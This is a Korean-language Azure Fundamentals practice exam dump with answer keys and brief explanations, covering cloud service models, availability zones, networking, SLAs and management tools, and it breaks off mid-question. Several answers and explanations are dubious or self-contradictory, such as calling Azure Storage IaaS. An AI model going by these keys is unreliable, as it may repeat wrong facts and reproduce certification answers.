무엇입니까?   전용 하드웨어\n  보안되지 않은 연결\n  제한된 저장\n  측정 가격\n  셀프 서비스 관리\n      \r문제 풀이\r...\r\r 4, 5\n1, 3번은 프라이빗 환경의 특징이며 2번은 초기 퍼블릭 환경의 문제점입니다.\n퍼블릭 클라우드는 사용한 만큼의 가격만 지불하고, 클라이언트가 직접 서비스를 관리할 수 있습니다.\n \r\r\r   공용 웹 사이트를 Azure로 마이그레이션하려는 경우 월별 사용 비용을 지불하도록 계획해야합니다. 밑줄이 그어진 텍스트를 검토하십시오. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오   변경이 필요하지 않습니다.\n  VPN 배포\n  모든 웹 사이트 데이터를 Azure로 전송하기 위한 지불\n  웹 사이트 연결 수 줄이기\n      \r문제 풀이\r...\r\r 1\n마이그레이션 시, 추가적인 설정 없이 진행할 수 있습니다.\n \r\r\r   회사에서 모든 데이터와 리소스를 Azure로 마이그레이션 할 계획입니다. 회사의 마이그레이션 계획에 따르면 PaaS (Platform as a Service) 솔루션 만 Azure에서 사용해야합니다. 계획된 마이그레이션을 지원하는 Azure 환경을 배포해야합니다.솔루션 : Azure App Service 및 Azure SQL 데이터베이스를 만듭니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1\nAzure App Service와 Azure SQL은 PaaS입니다.\n \r\r\r   회사에서 모든 데이터와 리소스를 Azure로 마이그레이션 할 계획입니다. 회사의 마이그레이션 계획에 따르면 PaaS (Platform as a Service) 솔루션 만 Azure에서 사용해야합니다. 계획된 마이그레이션을 지원하는 Azure 환경을 배포해야합니다. 솔루션 : Microsoft SQL Server가 설치된 Azure App Service 및 Azure 가상 머신을 만듭니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\nVM은 IaaS입니다.\n \r\r\r   회사에서 모든 데이터와 리소스를 Azure로 마이그레이션 할 계획입니다. 회사의 마이그레이션 계획에 따르면 PaaS (Platform as a Service) 솔루션 만 Azure에서 사용해야합니다. 계획된 마이그레이션을 지원하는 Azure 환경을 배포해야합니다. 솔루션 : Azure App Service 및 Azure Storage 계정을 만듭니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\nAzure Storage는 IaaS입니다.\n \r\r\r   회사는 회사의 모든 고객이 사용하는 App1이라는 계정을 호스팅합니다. App1은 매월 처음 3 주 동안 사용량이 적고 매월 마지막 주 동안 사용량이 매우 높습니다. 이러한 유형의 사용 패턴에 대한 비용 관리를 지원하는 Azure Cloud Services의 이점은 무엇인가요?   고 가용성\n  높은 지연\n  탄력성\n  부하 분산\n      \r문제 풀이\r...\r\r 3\n자원 리소스를 추가, 제거하는 특징은 탄력성입니다.\n \r\r\r   웹 애플리케이션을 Azure로 마이그레이션 할 계획입니다. 웹 애플리케이션은 외부 사용자가 액세스합니다. 웹 애플리케이션을 관리하는 데 사용되는 관리 노력의 양을 최소화하려면 클라우드 배포 솔루션을 권장해야합니다. 추천에 무엇을 포함해야합니까?   SaaS\n  PaaS\n  IaaS\n  DaaS\n      \r문제 풀이\r...\r\r 2\n호스트의 입장에서 가장 관리의 양이 적은 것은 SaaS이지만, 웹 애플리케이션이 포함되어 PaaS입니다.\n \r\r\r   Azure 가상 머신 및 Azure SQL 데이터베이스에 어떤 클라우드 배포 솔루션이 사용 되나요? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.     \r문제 풀이\r...\r\r VM은 IaaS, SQL은 PaaS입니다.\n \r\r\r   100 개의 서버가 포함 된 온-프레미스 네트워크가 있습니다. 사용자에게 추가 리소스를 제공하는 솔루션을 권장해야합니다. 솔루션은 자본 및 운영 비용을 최소화해야합니다. 추천에 무엇을 포함해야합니까?   퍼블릭 클라우드로의 완전한 마이그레이션\n  추가 데이터 센터\n  사설 클라우드\n  하이브리드 클라우드\n      \r문제 풀이\r...\r\r 3\n이미 서버가 있으며, 이에 대한 비용최소화를 위해서는 프라이빗 클라우드를 구성해야합니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   온-프레미스 네트워크에서 Azure로 여러 서버를 마이그레이션 할 계획입니다. 서버에 공용 클라우드 서비스를 사용할 때의 주요 이점을 식별해야합니다. 무엇을 식별해야합니까?   퍼블릭 클라우드는 민간 기업이 아닌 공공 소유입니다.\n  퍼블릭 클라우드는 기업에 클라우드를 향상시킬 수 있는 능력을 제공하는 크라우드 소싱 솔루션 입니다.\n  모는 고용 클라우드 리소스는 모든 공용 구성원이 자유롭게 액세스 할 수 있습니다.\n  퍼블릭 클라우드는 여러 기업이 각각 클라우드에서 리소스의 일부를 사용하는 공유 엔티티입니다.\n      \r문제 풀이\r...\r\r D\n퍼블릭 클라우드는 여러 기업이 한 기업의 클라우드 리소스를 사용합니다.\n \r\r\r   여러 Azure 가상 머신을 배포 할 계획입니다. 단일 데이터 센터가 실패하는 경우 가상 머신에서 실행중인 서비스를 사용할 수 있는지 확인해야합니다. 솔루션 : 가상 머신을 둘 이상의 확장 집합에 배포합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\n가용성 집합은 데이터 센터 내에서의 논리적 그룹입니다.\n \r\r\r   여러 Azure 가상 머신을 배포 할 계획입니다. 단일 데이터 센터가 실패하는 경우 가상 머신에서 실행중인 서비스를 사용할 수 있는지 확인해야합니다. 솔루션 : 두 개 이상의 가용성 영역에 가상 머신을 배포합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1 가용성 영역은 각 데이터 센터이므로, 하나의 데이터 센터가 실패해도 정상적으로 작동합니다.\n \r\r\r   여러 Azure 가상 머신을 배포 할 계획입니다. 단일 데이터 센터가 실패하는 경우 가상 머신에서 실행중인 서비스를 사용할 수 있는지 확인해야합니다. 솔루션 : 가상 머신을 둘 이상의 지역에 배포합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\n지역은 각 지역에 따라 규정과 법이 다를 수 있습니다.\n \r\r\r   데이터 센터의 Hyper-V 호스트에서 호스팅되는 가상 머신 1,000 개가 있습니다. 모든 가상 머신을 Azure 종량제 구독으로 마이그레이션 할 계획입니다. 계획된 Azure 솔루션에 사용할 비용 모델을 식별해야합니다. 어떤 지출 모델을 식별해야합니까?   운영\n  탄성\n  자본\n  확장 가능\n      \r문제 풀이\r...\r\r 1\n  후불로 지불하는 것을 OpEx 또는 운영 모델이라 합니다.\n \r\r\r   답변하려면 왼쪽 열에서 오른쪽 설명으로 적절한 혜택을 드래그하십시오. 각 혜택은 한 번, 두 번 이상 사용하거나 전혀 사용하지 않을 수 있습니다.     \r문제 풀이\r...\r\r  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   회사에 여러 서버가 포함 된 온 프레미스 네트워크가 있습니다. 회사는 네트워크 관리자의 다음과 같은 관리 책임을 줄일 계획입니다.  ✑ 애플리케이션 데이터 백업\r✑ 실패한 서버 하드웨어 교체\r✑ 물리적 서버 보안 관리\r✑ 서버 운영 체제 업데이트\r✑ 공유 문서에 대한 권한 관리 회사는 여러 서버를 Azure 가상 머신으로 마이그레이션 할 계획입니다.\r계획된 마이그레이션 후 감소 할 관리 책임을 식별해야합니다. 어떤 두 가지 책임을 식별해야합니까? 각 정답은 완전한 해결책을 제시합니다.\n  실패한 서버 하드웨어 교체\n  애플리케이션 데이터 백업\n  물리적 서버 보안 관리\n  서버 운영 체제 업데이트\n  공유 문서에 대한 권한 관리\n    \r문제 풀이\r...\r\r 1, 3\n서버 하드웨어와 물리적 서버 보안은 호스트가 설정할 수 없습니다.\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r 한 리전의 리소스 구독은 항상 공유되는 것은 아닙니다. 리소스 그룹의 태그를 적용시켰을 때, 모든 리소스 그룹이 태그가 적용되는 것은 아닙니다. 모든 리소스 권한을 주었어도, 비용 등의 몇몇의 권한은 줄 수 없습니다.  \r\r\r   회사에서 Azure에 AI (인공 지능) 솔루션을 배포 할 계획입니다. 회사는 예측 분석 솔루션을 구축, 테스트 및 배포하기 위해 무엇을 사용해야합니까?   Azure Logic Apps\n  Azure Machine Learning Studio\n  Azure batch\n  Azure Cosmos DB\n      \r문제 풀이\r...\r\r 2\n  (Azure AI 참조)[https://mung0001.github.io/docs/azure/microsoftazure/azure07/]\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오.     \r문제 풀이\r...\r\r   Azure Advisor는 보안과는 연관이 있지만, Azure AD(Datalog서비스)와는 연관이 없습니다. Azure Advisor는 가용성, 비용, 보안성 등의 컨설팅을 지원합니다. Azure Advisor은 직접적으로 VM의 네트워크 세팅에는 관여하지 않습니다.  \r\r\r   여러 지원 엔지니어가 다음 표에 표시된 컴퓨터를 사용하여 Azure를 관리 할 계획입니다. 각 컴퓨터에서 사용할 수있는 Azure 관리 도구를 식별해야합니다. 각 컴퓨터에 대해 무엇을 식별해야합니까? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.     \r문제 풀이\r...\r\r   모든 리소스에는 CLI, Portal, PowerShell을 사용할 수 있습니다.  \r\r\r   Azure 정책은 클라우드 인프라에 개체를 배포하고 Azure 환경에서 일관성을 구현하기위한 공통 플랫폼을 제공합니다. 밑줄이 그어진 텍스트를 검토하십시오. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  Resource groups provide\n  Azure Resource Manager provides\n  Management groups provide\n      \r문제 풀이\r...\r\r 3\nAzure Policies Provide는 Resource Manager와 관련있습니다.\n \r\r\r   Azure 서비스를 올바른 설명과 일치시킵니다. 대답하려면 왼쪽 열에서 오른쪽 설명으로 적절한 Azure 서비스를 끕니다. 각 서비스는 한 번, 두 번 이상 또는 전혀 사용하지 않을 수 있습니다     \r문제 풀이\r...\r\r  \r\r\r   회사에는 여러 사업부가 있습니다. 각 사업부에는 일상적인 작업을 위해 20 개의 서로 다른 Azure 리소스가 필요합니다. 모든 사업부에는 동일한 유형의 Azure 리소스가 필요합니다. Azure 리소스 생성을 자동화하는 솔루션을 권장해야합니다. 권장 사항에 무엇을 포함해야합니까?   Azure Resource Manager 템플릿\n  Virtual Machine scale sets\n  the Azure API Management Service\n  management groups\n      \r문제 풀이\r...\r\r 여러 서비스 및 자동화를 위해서는 stack을 생성하기 위한 탬플릿을 사용해야합니다.\n \r\r\r   Azure 서비스를 올바른 정의와 일치시킵니다. 대답하려면 왼쪽 열에서 오른쪽 설명으로 적절한 Azure 서비스를 끕니다. 각 서비스는 한 번, 두 번 이상 또는 전혀 사용하지 않을 수 있습니다.     \r문제 풀이\r...\r\r  \r\r\r   중요한 LOB (기간 업무) 응용 프로그램을 Azure에 배포 할 계획입니다. 애플리케이션은 Azure 가상 머신에서 실행됩니다. 응용 프로그램에 대한 배포 솔루션을 권장해야합니다. 이 솔루션은 99.99 %의 보장 된 가용성을 제공해야합니다. 배포를 위해 권장해야하는 최소 가상 머신 수와 최소 가용 영역 수는 얼마입니까? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.     \r문제 풀이\r...\r\r 99.99%의 가용성을 위해서는 2개의 리전에 VM이 존재해야합니다.\n \r\r\r   여러 리소스의 이벤트를 중앙 리포지토리로 연결하려면 어떤 Azure 서비스를 사용해야합니까?   Azure Event Hubs\n  Azure Analysis Services\n  Azure Monitor\n  Azure Log Analytics\n      \r문제 풀이\r...\r\r 3\nAzure Monitor을 사용해야합니다.\n \r\r\r   Azure 환경이 있습니다. Android 노트북에서 새 Azure 가상 머신을 만들어야합니다. Azure Cloud Shell에서 PowerShell을 사용합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1\n핸드폰에서도 웹을 통해 Cloud Shell을 사용할 수 있습니다.\n \r\r\r   Azure 환경이 있습니다. Android 노트북에서 새 Azure 가상 머신을 만들어야합니다. PowerApps 포털을 사용합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\nPowerApps은 웹 페이지 레이아웃을 만드는 도구입니다.\n \r\r\r   Azure 환경이 있습니다. Android 노트북에서 새 Azure 가상 머신을 만들어야합니다. Azure Portal을 사용합니다.   Yes\n  No\n      \r문제 풀이\r...\r\r A\n \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r   데이터 베이스는 최소 3개의 복제본을 가집니다. 데이터 베이스는 설정시에 백업이 생성됩니다. 스토리지 용량 제한은 2 TB 이상을 가지는 스토리지 서비스도 있습니다  \r\r\r   다음 각 명령문에 대해 해당 명령문이 참이면 예를 선택하십시오. 그렇지 않으면 아니오를 선택하십시오.     \r문제 풀이\r...\r\r   모든 지역의 가용성영역이 있는 것은 아닙니다. window server는 VM을 통해만 생성가능한 것이 아닙니다. 복제하는 데에 사용하는 것은 맞지만, 주 목적은 보안, 내결함성 등입니다.  \r\r\r   Azure 지역에는 지연 시간이 짧은 네트워크를 사용하여 연결된 하나 이상의 데이터 센터가 포함됩니다.   변경이 필요하지 않습니다.\n  Is found in each country where Microsoft has a subsidiary office\n  Can be found in every country in Europe and the Americas only\n  Contains one or more data centers that are connect by using a high-latency network\n      \r문제 풀이\r...\r\r 1\n \r\r\r   20 개의 가상 머신을 Azure 환경에 배포 할 계획입니다. VM1이라는 가상 머신이 다른 가상 머신에 연결할 수 없도록하려면 VM1을 별도의 가상 네트워크에 배포해야합니다.   변경이 필요하지 않습니다.\n  다른 가상 머신과 다른 운영 체제 실행\n  별도의 리소스 그룹에 배포\n  두 개의 네트워크 엔터페이스가 있습니다.\n      \r문제 풀이\r...\r\r 1\n네트워크 설정이 아닌 NIC 등의 설정을 통해 가능합니다.\n \r\r\r   여러 Azure 가상 머신에 동시에 권한을 위임해야하는 경우 동일한 Azure 지역에 Azure 가상 머신을 배포해야합니다.   변경이 필요하지 않습니다.\n  동일한 Azure Resource Manager 템플릿 사용\n  동일한 리소스 그룹\n  동일한 리전\n      \r문제 풀이\r...\r\r 3\n  동일한 리소스 그룹에 생성하면 권한이 유지됩니다.\n \r\r\r   회사의 개발자 팀은 매주 50 개의 사용자 지정 가상 컴퓨터를 배포 한 다음 제거 할 계획입니다. 가상 머신 중 30 개는 Windows Server 2016을 실행하고 가상 머신 중 20 개는 Ubuntu Linux를 실행합니다. 가상 머신을 배포하고 제거하는 데 필요한 관리 노력을 최소화 할 Azure 서비스를 권장해야합니다. 무엇을 추천해야합니까?   1. Azure 예약 Vm 인스턴스\n  Azure 가상 머신 확장 집합\n  Azure DevTest Labs\n  Microsoft management Desktop\n      \r문제 풀이\r...\r\r 3\n개발자팀은 DevTest Labs를 사용하여 편하게 관리가 가능합니다.\n \r\r\r   Azure SQL Data Warehouse의 이점 중 하나는 플랫폼에 고 가용성이 내장되어 있다는 것입니다.   변경이 필요하지 않습니다.\n  자동 확장\n  데이터 압축\n  버전 관리\n      \r문제 풀이\r...\r\r 1\n  고 가용성이란 데이터가 손실되지 않는 것을 뜻하므로, 보기에는 존재하지 않습니다.\n \r\r\r   지원 엔지니어는 Azure CLI를 사용하여 여러 Azure 관리 작업을 수행 할 계획입니다. 컴퓨터에 CLI를 설치합니다. 지원 엔지니어에게 CLI를 실행하는 데 사용할 도구를 알려야합니다. 지원 엔지니어에게 어떤 도구를 사용하도록 지시해야합니까?   명령 프롬프트\n  Azure 리소스 탐색기\n  Windows PowerShell\n  windows Defender 방화벽\n  네트워크 및 공유 센터\n      \r문제 풀이\r...\r\r A, 3\n  CLI, WindowPowerShell, CloudShell, Web console\n \r\r\r   Azure Cloud Shell을 사용하여 Azure를 관리해야합니다. 어떤 Azure Portal 아이콘을 선택해야하나요? 답변하려면 답변 영역에서 적절한 아이콘을 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   Azure에 20TB의 데이터를 저장할 계획입니다. 데이터는 Microsoft Power BI를 사용하여 가끔 액세스되고 시각화됩니다. 데이터에 대한 스토리지 솔루션을 추천해야합니다. 어떤 두 가지 솔루션을 권장해야합니까? 각 정답은 완전한 해결책을 제시합니다.   Azure Data Lake\n  Azure Cosmos DB\n  Azure SQL Datawarehouse\n  Azure SQL 데이터베이스\n  PostgreSQL 용 Azure 데이터베이스\n      \r문제 풀이\r...\r\r 1, 3 Cosmos DB (NoSQL), SQL DB(최대 4TB). PostgreSQL DB (최대 16TB)\n \r\r\r   10 개의 웹앱 이 포함 된 Azure 환경이 있습니다. 모든 Azure 리소스를 관리하려면 어떤 URL에 연결해야합니까? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   Azure 서비스에 대한 액세스를 보호하기 위해 Azure 가용성 영역을 사용할 수 있는 오류 유형을 식별해야합니다. 무엇을 식별해야합니까?   물리적 서버 오류\n  Azure 지역 오류\n  저장 실패\n  Azure 데이터 센터 오류\n      \r문제 풀이\r...\r\r 4\n가용성 영역과 연관있는 것은 데이터 센터입니다.\n \r\r\r   귀사의 네트워크를 Azure로 확장 할 계획입니다. 네트워크에는 IP 주소 131.107.200.1을 사용하는 VPN 어플라이언스가 포함되어 있습니다. VPN 어플라이언스를 식별하는 Azure 리소스를 만들어야합니다. 어떤 Azure 리소스를 만들어야합니까? 답변하려면 답변 영역에서 적절한 리소스를 선택하십시오.     \r문제 풀이\r...\r\r  \r\r\r   Windows Server 2016을 실행하는 VM1이라는 가상 머신이 있습니다. VM1은 미국 동부 Azure 지역에 있습니다. VM1의 가용성에 영향을 줄 수있는 서비스 오류 알림을 보려면 Azure Portal에서 어떤 Azure 서비스를 사용해야합니까?   Azure 패브릭 서비스\n  Azure 모니터\n  Azure VM\n  Azure Advisor\n      \r문제 풀이\r...\r\r 2\nAzure 모니터를 통해 오류 로그를 확인할 수 있습니다.\n \r\r\r   Azure 관리자는 Azure 리소스를 만드는 PowerShell 스크립트를 실행할 계획입니다. 스크립트를 실행하는 데 사용할 컴퓨터 구성을 권장해야합니다. Linux를 실행하고 Azure CLI 도구가 설치된 컴퓨터에서 스크립트를 실행합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\n  Linux CLI와 PowerShell은 서로 다른 도구입니다.\n \r\r\r   Azure 관리자는 Azure 리소스를 만드는 PowerShell 스크립트를 실행할 계획입니다. 스크립트를 실행하는 데 사용할 컴퓨터 구성을 권장해야합니다. Chrome OS를 실행하고 Azure Cloud Shell을 사용하는 컴퓨터에서 스크립트를 실행합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1 Cloud Shell은 PowerShell을 지원합니다.\n \r\r\r   Azure 관리자는 Azure 리소스를 만드는 PowerShell 스크립트를 실행할 계획입니다. 스크립트를 실행하는 데 사용할 컴퓨터 구성을 권장해야합니다. macOS를 실행하고 PowerShell Core 6.0이 설치된 컴퓨터에서 스크립트를 실행합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1 MacOS에 PowerShell 설치가 가능합니다.\n \r\r\r   10 개의 가상 네트워크와 100 개의 가상 머신이 포함 된 Azure 환경이 있습니다. 모든 Azure 가상 네트워크에 대한 인바운드 트래픽 양을 제한해야합니다. 무엇을 만들어야합니까?   하나의 NSG\n  10개의 가상 네트워크 게이트웨이\n  10 Azure ExpreeRoute 회로\n  하나의 Azure 방화벽\n      \r문제 풀이\r...\r\r 4 Azure firewalld은 트래픽을 제한할 수 있습니다.\n \r\r\r   여러 Azure 가상 머신이 포함 된 Azure 환경이 있습니다. 온-프레미스 네트워크의 클라이언트 컴퓨터가 Azure 가상 머신과 통신 할 수 있도록하는 솔루션을 구현할 계획입니다. 계획된 솔루션에 대해 만들어야하는 Azure 리소스를 권장해야합니다. 권장 사항에 어떤 Azure 리소스를 포함해야합니까? 각 정답은 솔루션의 일부를 제공합니다.   가상 네트워크 게이트웨이\n  로드 밸런서\n  애플리케이션 게이트웨이\n  가상 네트워크\n  게이트웨어 서브넷\n      \r문제 풀이\r...\r\r 1, 5 이미 VM이 있으므로 가상네트워크는 존재합니다. 즉 가상 네트워크와 게이트웨이 와 서브넷을 추가하면 됩니다.\n \r\r\r   Azure 서비스를 올바른 설명과 일치시킵니다. 대답하려면 왼쪽 열에서 오른쪽 설명으로 적절한 Azure 서비스를 끕니다. 각 서비스는 한 번, 두 번 이상 또는 전혀 사용하지 않을 수 있습니다.     \r문제 풀이\r...\r\r   3번째는 Data Lake입니다.  \r\r\r   다음 작업을 수행하는 데 사용해야하는 Azure Portal의 블레이드를 식별해야합니다.  ✑ 보안 권장 사항을 봅니다.\r✑ Azure 서비스의 상태를 모니터링합니다.\r✑ 사용 가능한 가상 머신 이미지를 찾습니다.\r각 작업에 대해 어떤 블레이드를 식별해야합니까? 답변하려면 답변 영역에서 적절한 옵션을 선택하십시오.\n   \r문제 풀이\r...\r\r  \r\r\r   Azure 환경이 있습니다. Android 노트북에서 새 Azure 가상 머신을 만들어야합니다. Azure Cloud Shell에서 Bash를 사용합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 1\n  Cloud Shell을 통해 생성이 가능합니다.\n \r\r\r   Azure 가상 머신을 만들 계획입니다. 가상 머신의 데이터 디스크를 저장하는 데 사용해야하는 스토리지 서비스를 식별해야합니다. 무엇을 식별해야합니까? 응답하려면 응답 영역에서 적절한 서비스를 선택하십시오.     \r문제 풀이\r...\r\r 데이터 디스크를 저장하는 데에는 Blobs가 주로 사용됩니다.\n \r\r\r   회사에서 여러 서버를 Azure로 이동할 계획입니다. 회사의 규정 준수 정책에 따르면 FinServer라는 서버는 별도의 네트워크 세그먼트에 있어야합니다. 규정 준수 정책 요구 사항을 충족하는 데 사용할 수있는 Azure 서비스를 평가하고 있습니다. 어떤 Azure 솔루션을 권장해야합니까?   FinServer 용 리소스 그룹 및 다른 모든 서버용 다른 리소스 그룹\n  FinServer 용 가상 네트워크 및 다른 모든 서버용 다른 가상 네트워크\n  FinServer 용 VPN 및 서로 서버용 가상 네트워크 게이트웨이\n  모든 서버에 대한 하나의 리소스 그룹 및 FinServer에 대한 리소스 잠금\n      \r문제 풀이\r...\r\r 2\n따로 구성한다는 말에 주의해야합니다.\n \r\r\r   Windows 10을 실행하는 여러 컴퓨터의 네트워크 드라이브를 Azure Storage에 매핑 할 계획입니다. 계획된 매핑 된 드라이브에 대해 Azure에서 저장소 솔루션을 만들어야합니다. 무엇을 만들어야합니까?   Azure SQL DB\n  VM data disk\n  Files service in a storage account\n  Bloss service in a storage account\n      \r문제 풀이\r...\r\r 3 SMB를 통해 파일 서비스를 적합한 통해 저장소 솔류션을 만들 수 있습니다.\n \r\r\r   Azure 데이터베이스 솔루션을 구현할 계획입니다. 다음 요구 사항을 충족하는 데이터베이스 솔루션을 구현해야합니다.  ✑ 여러 지역의 데이터를 동시에 추가 할 수 있습니다 . ✑ JSON 문서를 저장할 수 있습니다.\r어떤 데이터베이스 서비스를 배포해야합니까?\n  \r문제 풀이\r...\r\r CosmosDB의 특징입니다.\n \r\r\r   회사에서 모든 네트워크 리소스를 Azure로 마이그레이션 할 계획입니다. Azure를 탐색하여 계획 프로세스를 시작해야합니다. 먼저 무엇을 만들어야합니까?   구독\n  리소스 그룹\n  가상 네트워크\n  관리 그룹\n      \r문제 풀이\r...\r\r 1\n  모든 권환의 기초는 구독입니다.\n \r\r\r   규칙에 따라 자동으로 이메일 알림을 보내는 온-프레미스 애플리케이션이 있습니다. 애플리케이션을 Azure로 마이그레이션 할 계획입니다. 애플리케이션을위한 서버리스 컴퓨팅 솔루션을 권장해야합니다. 추천에 무엇을 포함해야합니까?   web app\n  Azure Marketplace의 서버 이미지\n  logic app\n  API app\n      \r문제 풀이\r...\r\r 3\nmail, 문서 등의 작업을 수행할 시에는 logic app을 사용합니다.\n \r\r\r   Azure에 웹 사이트를 배포 할 계획입니다. 이 웹 사이트는 전 세계 사용자가 액세스 할 수 있으며 대용량 비디오 파일을 호스팅합니다. 최상의 비디오 재생 환경을 제공하기 위해 사용해야하는 Azure 기능을 권장해야합니다. 무엇을 추천해야합니까?   애플리케이션 게이트웨이\n  Azure ExpressRoute circuit\n  a content delivery network (CDN)\n  an Azure Traffic Manager profile\n      \r문제 풀이\r...\r\r 3\nCDN은 전 세계의 호스팅을 위해 사용됩니다.\n \r\r\r   귀사는 Azure에 데이터를 업로드 할 수백만 개의 센서를 배포 할 계획입니다. 계획된 솔루션을 지원하기 위해 만들어야하는 Azure 리소스를 식별해야합니다. 어떤 두 Azure 리소스를 식별해야합니까? 각 정답은 솔루션의 일부를 제공합니다.   Azure data Lake\n  Azure Queue storage\n  Azure File Storage\n  Azure IoT Hub\n  Azure Notification Hubs\n      \r문제 풀이\r...\r\r 2, 4\n센서는 IoT Hub에 관한 설명이고, 식별을 위한 통신은 Queue에 대한 설명입니다.\n \r\r\r   Azure 웹앱이 있습니다. iPhone에서 웹 앱의 설정을 관리해야합니다. 사용할 수있는 두 가지 Azure 관리 도구는 무엇인가요? 각 정답은 완전한 해결책을 제시합니다.   Azure CLI\n  Azure potal\n  Azure Cloud Shell\n  Windows PowerShell\n  Azure 저장소 탐색기\n      \r문제 풀이\r...\r\r 2, 3\n모바일에서 관리할 수 있는 도구들은 모바일 앱, 포탈, 포탈의 클라우드 쉘이 있습니다.\n \r\r\r   서비스 수준 계약 (SLA)이 99.95 % 인 Azure 웹앱과 SLA가 99.99 % 인 Azure SQL 데이터베이스로 구성된 애플리케이션이 있습니다. 애플리케이션의 복합 SLA는 99.94 %에 해당하는 두 SLA의 제품입니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  애플리케이션과 관련된 최저 SLA (99.95%)\n  애플리케이션과 관련된 최고 SLA (99.99%)\n  두 SLA의 차이 (0.05%)\n      \r문제 풀이\r...\r\r 1 99.95 x 99.99 = 99.94\n \r\r\r   RG1이라는 자원 그룹에 삭제 잠금이있는 경우 글로벌 관리자 그룹의 구성원 만 RG1을 삭제할 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오   변경이 필요하지 않습니다.\n  관리자 전에 삭제 잠금을 제거해야합니다.\n  관리자 전에 Azure 정책을 수정해야합니다.\n  관리자 전에 Azure 태그를 추가해야합니다.\n      \r문제 풀이\r...\r\r 2\n제거를 위해서는 관리자가 삭제 잠금을 제거해야합니다.\n \r\r\r    Azure Germany는 독일의 합법적 인 거주자 만 사용할 수 있습니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  독일에 등록된 기업만\n  독일에 기반을 둔 파트너로부터 Azure 라이선스를 구매한 기업만 해당\n  데이터가 독일에 있어야하는 사용자 또는 기업\n      \r문제 풀이\r...\r\r D\n \r\r\r   가상 머신을 생성 한 후에는 TCP 포트 8080에서 가상 머신으로의 연결을 허용하도록 NSG (네트워크 보안 그룹)를 수정해야합니다. 설명이 정확하면 \u0026ldquo;변경할 필요 없음\u0026quot;을 선택합니다. 설명이 정확하지 않은 경우 해당 설명을 올바르게 만드는 답을 선택하십시오.   변경이 필요하지 않습니다.\n  가상 네트워크 게이트웨이\n  가상 네트워크\n  라우팅 테이블\n      \r문제 풀이\r...\r\r 1 port로 인바운드, 아웃바운드를 수정하는 서비스는 NSG입니다.\n \r\r\r   Azure 환경에는 여러 Azure 가상 머신이 포함되어 있습니다.HTTP를 통해 인터넷에서 VM1이라는 가상 머신에 액세스 할 수 있는지 확인해야합니다. 솔루션 : DDoS 보호 계획을 수정합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2 방화벽을 수정해야합니다.\n \r\r\r   Azure 환경에는 여러 Azure 가상 머신이 포함되어 있습니다. HTTP를 통해 인터넷에서 VM1이라는 가상 머신에 액세스 할 수 있는지 확인해야합니다. 솔루션 : Azure 방화벽을 수정합니다. 이것이 목표를 충족합니까?    \r문제 풀이\r...\r\r 1\n위와 동일\n \r\r\r   Azure 환경에는 여러 Azure 가상 머신이 포함되어 있습니다. HTTP를 통해 인터넷에서 VM1이라는 가상 머신에 액세스 할 수 있는지 확인해야합니다. 해결 방법 : Azure Traffic Manager 프로필을 수정합니다. 이것이 목표를 충족합니까?   Yes\n  No\n      \r문제 풀이\r...\r\r 2\n  방화벽을 수정해야합니다.\n \r\r\r   Azure Government를 사용하여 클라우드 솔루션을 개발할 수있는 두 가지 유형의 고객은 무엇입니까? 각 정답은 완전한 해결책을 제시합니다.   캐나다 정부 계약자\n  유럽 정부 계약자\n  미국 정부 기관\n  미국 정부 계약자\n  유럽 정부 기관\n      \r문제 풀이\r...\r\r 3, 4 Azure Government는 미국 정부 기관의 준수에 따라 생성되었습니다.\n \r\r\r   Azure AD (Azure Active Directory) 사용자가 익명 IP 주소를 사용하여 인터넷에서 Azure AD에 연결할 때 사용자에게 